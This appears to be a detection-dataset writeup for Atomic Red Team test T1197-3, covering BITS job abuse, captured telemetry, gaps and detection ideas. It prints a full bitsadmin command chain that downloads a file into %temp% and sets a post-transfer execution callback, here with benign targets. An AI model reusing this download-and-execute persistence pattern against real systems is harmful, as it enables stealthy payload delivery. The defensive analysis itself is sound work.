# T1197-3: BITS Jobs — Persist, Download, & Execute

## Technique Context

BITS Jobs (Background Intelligent Transfer Service) is a Windows feature designed for asynchronous file transfers that continues operating across reboots and network interruptions. Attackers abuse BITS for defense evasion and persistence by leveraging its legitimate network transfer capabilities to download malicious payloads while blending in with normal system traffic. The technique is particularly valuable because BITS transfers appear as legitimate system activity, can persist across reboots, and support notification callbacks that execute commands when transfers complete.

The detection community focuses on monitoring bitsadmin.exe usage, BITS job creation and modification, network connections to suspicious domains, and the execution of notification commands. This technique is commonly seen in APT campaigns and commodity malware for initial payload delivery and establishing persistence mechanisms.

## What This Dataset Contains

This dataset captures a complete BITS job lifecycle through bitsadmin.exe command-line operations. The technique execution begins with PowerShell launching a cmd.exe process that runs a compound command: `"cmd.exe" /c bitsadmin.exe /create AtomicBITS & bitsadmin.exe /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %temp%\bitsadmin3_flag.ps1 & bitsadmin.exe /setnotifycmdline AtomicBITS C:\Windows\system32\notepad.exe NULL & bitsadmin.exe /resume AtomicBITS & ping -n 5 127.0.0.1 >nul 2>&1 & bitsadmin.exe /complete AtomicBITS`.

The data shows five distinct bitsadmin.exe process creations (Sysmon EID 1) with different command lines: `/create AtomicBITS`, `/addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\Windows\TEMP\bitsadmin3_flag.ps1`, `/setnotifycmdline AtomicBITS C:\Windows\system32\notepad.exe NULL`, `/resume AtomicBITS`, and `/complete AtomicBITS`. Each bitsadmin process loads BitsProxy.dll (Sysmon EID 7), indicating BITS functionality engagement.

The dataset includes DNS resolution for raw.githubusercontent.com (Sysmon EID 22), temporary file creation at `C:\Windows\Temp\BITB4C0.tmp` by svchost.exe (Sysmon EID 11), and a ping command for timing delay. Security events (EID 4688/4689) provide complementary process creation and termination telemetry with full command lines for all bitsadmin executions.

## What This Dataset Does Not Contain

The dataset lacks evidence of the actual file download completion - while DNS resolution occurs and temporary files are created, there's no Sysmon EID 11 showing the final destination file `C:\Windows\TEMP\bitsadmin3_flag.ps1` being written. The notification command (notepad.exe) execution is also absent, suggesting the BITS job may not have completed successfully or the notification callback didn't trigger within the capture window.

No network connection events (Sysmon EID 3) are present for the HTTPS download, likely filtered out by the sysmon-modular configuration. The PowerShell channel contains only test framework boilerplate (Set-StrictMode, Set-ExecutionPolicy Bypass) rather than the actual BITS job commands. Additionally, there are no Windows Defender alerts or blocks, indicating the technique executed without AV interference.

## Assessment

This dataset provides excellent visibility into BITS job administration through bitsadmin.exe, capturing the complete command-line sequence and associated process telemetry. The Security channel's process creation events with full command-line logging offer comprehensive coverage of the technique execution, while Sysmon adds valuable context through BitsProxy.dll loading and DNS queries. However, the dataset's value is somewhat limited by the apparent incomplete file transfer and missing notification callback execution, which reduces its utility for detecting the full attack chain.

The data quality is strong for detecting BITS job creation and management activities, but analysts should be aware that successful payload delivery and execution evidence may require longer collection windows or additional log sources.

## Detection Opportunities Present in This Data

1. **BITS Job Creation via Bitsadmin** - Monitor Security EID 4688 for bitsadmin.exe process creation with `/create` parameter to detect BITS job establishment
2. **BITS File Transfer Setup** - Alert on bitsadmin.exe `/addfile` commands with external URLs, particularly targeting suspicious domains like raw.githubusercontent.com
3. **BITS Notification Command Configuration** - Detect bitsadmin.exe `/setnotifycmdline` usage that configures callback commands for post-transfer execution
4. **Suspicious BITS Job Names** - Monitor for non-standard BITS job names like "AtomicBITS" that deviate from typical Windows naming conventions
5. **BitsProxy.dll Loading Pattern** - Create detection for multiple rapid bitsadmin.exe processes each loading BitsProxy.dll within short timeframes
6. **BITS Job Lifecycle Commands** - Correlate sequences of bitsadmin.exe commands (/create, /addfile, /setnotifycmdline, /resume, /complete) to identify comprehensive BITS abuse
7. **External Domain DNS Queries by BITS Service** - Monitor Sysmon EID 22 for svchost.exe resolving suspicious external domains in BITS context
8. **Command Shell Chaining to BITS** - Detect cmd.exe processes with compound commands containing multiple bitsadmin.exe operations
9. **Temporary File Creation in BITS Context** - Alert on rapid creation of .tmp files in Windows\Temp during BITS activity timeframes
